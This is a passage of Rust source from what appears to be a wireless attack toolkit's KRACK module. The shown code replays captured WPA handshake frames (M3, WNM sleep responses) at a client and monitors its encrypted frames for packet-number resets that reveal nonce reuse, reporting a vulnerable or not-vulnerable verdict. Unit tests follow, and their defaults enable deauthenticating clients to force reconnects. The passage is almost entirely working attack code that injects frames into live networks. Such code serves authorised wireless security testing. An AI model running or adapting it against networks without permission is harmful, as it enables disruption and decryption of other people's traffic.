        KrackVariant::WnmGtk | KrackVariant::WnmIgtk => captured.wnm_sleep_resp.as_ref(),
    };

    let replay_frame = match replay_frame {
        Some(f) => f,
        None => {
            result.verdict = KrackVerdict::Skipped;
            result.detail = "replay frame not available".to_string();
            result.elapsed = test_start.elapsed();
            return result;
        }
    };

    // Replay the frame m3_replay_count times
    let mut replays_sent: u32 = 0;

    for i in 0..params.m3_replay_count {
        if !running.load(Ordering::SeqCst) { break; }

        if shared.tx_frame(replay_frame, tx_opts).is_ok() {
            replays_sent += 1;
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.frames_sent += 1;
            info.m3_replays_sent += 1;
        }

        if i < params.m3_replay_count - 1 && params.m3_replay_delay > Duration::ZERO {
            thread::sleep(params.m3_replay_delay);
        }
    }

    result.replays_sent = replays_sent;

    push_event(events, attack_start, KrackEventKind::M3Replayed {
        variant,
        count: replays_sent,
    });

    // Monitor for nonce reuse (PN going backwards in encrypted frames)
    update_phase(info, KrackPhase::Monitoring);
    let nonce_reuses = monitor_nonce_reuse(
        reader, bssid, captured.client_mac.as_ref(),
        params, info, events, running, attack_start, variant,
    );

    result.nonce_reuses = nonce_reuses;
    result.verdict = if nonce_reuses > 0 {
        KrackVerdict::Vulnerable
    } else {
        KrackVerdict::NotVulnerable
    };
    result.detail = if nonce_reuses > 0 {
        format!("{} nonce reuse(s) detected!", nonce_reuses)
    } else {
        "no nonce reuse detected (patched or timing)".to_string()
    };
    result.elapsed = test_start.elapsed();
    result
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Nonce reuse monitoring
// ═══════════════════════════════════════════════════════════════════════════════

/// Monitor encrypted data frames from the client for PN (Packet Number) reuse.
///
/// After M3 replay, if the client reinstalls the PTK, it resets its PN counter.
/// We detect this by watching for PN values that go backwards.
fn monitor_nonce_reuse(
    reader: &crate::pipeline::PipelineSubscriber,
    _bssid: &MacAddress,
    client_mac: Option<&MacAddress>,
    params: &KrackParams,
    info: &Arc<Mutex<KrackInfo>>,
    events: &Arc<EventRing<KrackEvent>>,
    running: &Arc<AtomicBool>,
    attack_start: Instant,
    variant: KrackVariant,
) -> u32 {
    let deadline = Instant::now() + params.monitor_duration;
    let mut last_pn: u64 = 0;
    let mut pn_baseline_set = false;
    let mut reuses: u32 = 0;

    while running.load(Ordering::SeqCst) {
        let now = Instant::now();
        if now >= deadline { break; }

        let remaining = deadline - now;
        let rx_timeout = remaining.min(params.rx_poll_timeout);

        match reader.recv_timeout(rx_timeout) {
            Some(frame) => {
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.frames_received += 1;
                }

                // Only interested in encrypted data frames
                if frame.raw.len() < 32 { continue; }
                let fc_low = frame.raw[0];
                let fc_high = frame.raw[1];
                let frame_type_val = (fc_low >> 2) & 0x03;
                let protected = fc_high & 0x40 != 0; // Protected flag

                if frame_type_val != 2 || !protected { continue; }

                // Check if from our target client
                let addr2 = &frame.raw[10..16];
                let from_client = client_mac.map_or(true, |mac| addr2 == mac.as_bytes());
                if !from_client { continue; }

                // Extract PN from CCMP header
                let has_qos = (fc_low >> 4) & 0x0F >= 8;
                let hdr_len = if has_qos { 26 } else { 24 };

                if frame.raw.len() <= hdr_len + 8 { continue; }
                let ccmp = &frame.raw[hdr_len..];

                // CCMP PN: PN0 | PN1<<8 | PN2<<16 | PN3<<24 | PN4<<32 | PN5<<40
                // Layout: ccmp[0]=PN0, ccmp[1]=PN1, ccmp[4]=PN2, ccmp[5]=PN3, ccmp[6]=PN4, ccmp[7]=PN5
                if ccmp.len() < 8 { continue; }
                let pn = ccmp[0] as u64
                    | (ccmp[1] as u64) << 8
                    | (ccmp[4] as u64) << 16
                    | (ccmp[5] as u64) << 24
                    | (ccmp[6] as u64) << 32
                    | (ccmp[7] as u64) << 40;

                if !pn_baseline_set {
                    last_pn = pn;
                    pn_baseline_set = true;
                } else if pn <= last_pn && last_pn > 10 {
                    // PN went backwards — nonce reuse!
                    reuses += 1;

                    push_event(events, attack_start, KrackEventKind::NonceReuse {
                        variant,
                        old_pn: last_pn,
                        new_pn: pn,
                        count: reuses,
                    });

                    last_pn = pn;
                } else {
                    last_pn = pn;
                }
            }
            None => continue,
        }
    }

    reuses
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════════════════════════════════════════

fn push_event(events: &Arc<EventRing<KrackEvent>>, start: Instant, kind: KrackEventKind) {
    let seq = events.seq() + 1;
    events.push(KrackEvent { seq, timestamp: start.elapsed(), kind });
}

fn update_phase(info: &Arc<Mutex<KrackInfo>>, phase: KrackPhase) {
    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
    info.phase = phase;
    info.elapsed = info.start_time.elapsed();
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_krack_params_default() {
        let params = KrackParams::default();
        assert_eq!(params.m3_replay_count, 3);
        assert_eq!(params.m3_replay_delay, Duration::from_millis(50));
        assert_eq!(params.handshake_timeout, Duration::from_secs(15));
        assert_eq!(params.monitor_duration, Duration::from_secs(5));
        assert_eq!(params.timeout, Duration::ZERO);
        assert!(params.deauth_to_reconnect);
        assert_eq!(params.deauth_count, 5);
        assert!(params.variant.is_none());
    }

    #[test]
    fn test_krack_info_default() {
        let info = KrackInfo::default();
        assert_eq!(info.phase, KrackPhase::Idle);
        assert!(!info.running);
        assert!(!info.handshake_captured);
        assert_eq!(info.m3_replays_sent, 0);
        assert_eq!(info.nonce_reuses_total, 0);
    }

    #[test]
    fn test_variant_parse() {
        assert_eq!(KrackVariant::from_str("ptk"), Some(KrackVariant::FourWayPtk));
        assert_eq!(KrackVariant::from_str("4way"), Some(KrackVariant::FourWayPtk));
        assert_eq!(KrackVariant::from_str("cve-2017-13077"), Some(KrackVariant::FourWayPtk));
        assert_eq!(KrackVariant::from_str("ft"), Some(KrackVariant::Ft));
        assert_eq!(KrackVariant::from_str("wnm-gtk"), Some(KrackVariant::WnmGtk));
        assert_eq!(KrackVariant::from_str("zeroed-tk"), Some(KrackVariant::ZeroedTk));
        assert_eq!(KrackVariant::from_str("garbage"), None);
    }

    #[test]
    fn test_variant_all_count() {
        assert_eq!(KrackVariant::all().len(), 11);
    }

    #[test]
    fn test_variant_cve_strings() {
        for variant in KrackVariant::all() {
            assert!(!variant.label().is_empty());
            assert!(!variant.cve().is_empty());
            assert!(!variant.description().is_empty());
            assert!(!variant.replay_frame().is_empty());
        }
    }

    #[test]
    fn test_variant_special_capture() {
        assert!(!KrackVariant::FourWayPtk.needs_special_capture());
        assert!(KrackVariant::Ft.needs_special_capture());
        assert!(KrackVariant::Tdls.needs_special_capture());
        assert!(KrackVariant::WnmGtk.needs_special_capture());
        assert!(KrackVariant::PeerKey.needs_special_capture());
        assert!(!KrackVariant::ZeroedTk.needs_special_capture());
    }

    #[test]
    fn test_variant_group_m1() {
        assert!(KrackVariant::GroupGtk.needs_group_m1());
        assert!(KrackVariant::GroupIgtk.needs_group_m1());
        assert!(!KrackVariant::FourWayPtk.needs_group_m1());
    }

    #[test]
    fn test_krack_attack_new() {
        let attack = KrackAttack::new(KrackParams::default());
        assert!(!attack.is_running());
        assert!(!attack.is_done());
        assert_eq!(attack.name(), "krack");
        let info = attack.info();
        assert_eq!(info.phase, KrackPhase::Idle);
    }

    #[test]
    fn test_extract_eapol_message_m1() {
        let bssid = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];
        let mut data = vec![0u8; 24 + 8 + 7];
        data[0] = 0x08; // Data frame
        data[1] = 0x02; // FromDS
        // Addr2 = BSSID
        data[10..16].copy_from_slice(&bssid);
        let hdr = 24;
        // LLC/SNAP + EAPOL
        data[hdr] = 0xAA; data[hdr+1] = 0xAA; data[hdr+2] = 0x03;
        data[hdr+6] = 0x88; data[hdr+7] = 0x8E;
        // EAPOL-Key header
        let eapol_off = hdr + 8;
        data[eapol_off + 1] = 3; // Type = Key
        // Key Info: Pairwise=1, ACK=1, MIC=0 → M1
        let key_info: u16 = (1 << 3) | (1 << 7); // pairwise + ack
        data[eapol_off + 5] = (key_info >> 8) as u8;
        data[eapol_off + 6] = (key_info & 0xFF) as u8;

        assert_eq!(extract_eapol_message(&data, &bssid), Some(1));
    }

    #[test]
    fn test_extract_eapol_message_m3() {
        let bssid = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];
        let mut data = vec![0u8; 24 + 8 + 7];
        data[0] = 0x08;
        data[1] = 0x02;
        data[10..16].copy_from_slice(&bssid);
        let hdr = 24;
        data[hdr] = 0xAA; data[hdr+1] = 0xAA; data[hdr+2] = 0x03;
        data[hdr+6] = 0x88; data[hdr+7] = 0x8E;
        let eapol_off = hdr + 8;
        data[eapol_off + 1] = 3;
        // M3: Pairwise=1, ACK=1, MIC=1, Secure=1, Install=1
        let key_info: u16 = (1 << 3) | (1 << 6) | (1 << 7) | (1 << 8) | (1 << 9);
        data[eapol_off + 5] = (key_info >> 8) as u8;
        data[eapol_off + 6] = (key_info & 0xFF) as u8;

        assert_eq!(extract_eapol_message(&data, &bssid), Some(3));
    }

    #[test]
    fn test_extract_eapol_message_m4() {
        let bssid = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];
        let mut data = vec![0u8; 24 + 8 + 7];
        data[0] = 0x08;
        data[1] = 0x01; // ToDS
        data[4..10].copy_from_slice(&bssid);
        let hdr = 24;
        data[hdr] = 0xAA; data[hdr+1] = 0xAA; data[hdr+2] = 0x03;
        data[hdr+6] = 0x88; data[hdr+7] = 0x8E;
        let eapol_off = hdr + 8;
        data[eapol_off + 1] = 3;
        // M4: Pairwise=1, ACK=0, MIC=1, Secure=1
        let key_info: u16 = (1 << 3) | (1 << 8) | (1 << 9);
        data[eapol_off + 5] = (key_info >> 8) as u8;
        data[eapol_off + 6] = (key_info & 0xFF) as u8;

        assert_eq!(extract_eapol_message(&data, &bssid), Some(4));
    }

    #[test]
    fn test_extract_eapol_message_group_m1() {
        let bssid = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];
        let mut data = vec![0u8; 24 + 8 + 7];
        data[0] = 0x08;
        data[1] = 0x02;
        data[10..16].copy_from_slice(&bssid);
        let hdr = 24;
        data[hdr] = 0xAA; data[hdr+1] = 0xAA; data[hdr+2] = 0x03;
        data[hdr+6] = 0x88; data[hdr+7] = 0x8E;
        let eapol_off = hdr + 8;
        data[eapol_off + 1] = 3;
        // Group M1: Pairwise=0, ACK=1, MIC=1
        let key_info: u16 = (1 << 7) | (1 << 8);
        data[eapol_off + 5] = (key_info >> 8) as u8;
        data[eapol_off + 6] = (key_info & 0xFF) as u8;

        assert_eq!(extract_eapol_message(&data, &bssid), Some(5));
    }

    #[test]
    fn test_extract_eapol_not_data() {
        let bssid = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];
        let mut data = vec![0u8; 40];
        data[0] = 0x80; // Beacon (management frame)
        data[10..16].copy_from_slice(&bssid);
        assert_eq!(extract_eapol_message(&data, &bssid), None);
    }

    #[test]
    fn test_krack_event_ring() {
        let ring = EventRing::<KrackEvent>::new(16);
        ring.push(KrackEvent {
            seq: 1,
            timestamp: Duration::from_millis(100),
            kind: KrackEventKind::ChannelLocked { channel: 6 },
        });
        let events = ring.drain();
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn test_krack_test_result_new() {
        let r = KrackTestResult::new(KrackVariant::FourWayPtk);
        assert_eq!(r.variant, KrackVariant::FourWayPtk);
        assert_eq!(r.verdict, KrackVerdict::Pending);
        assert_eq!(r.replays_sent, 0);
        assert_eq!(r.nonce_reuses, 0);
    }
}
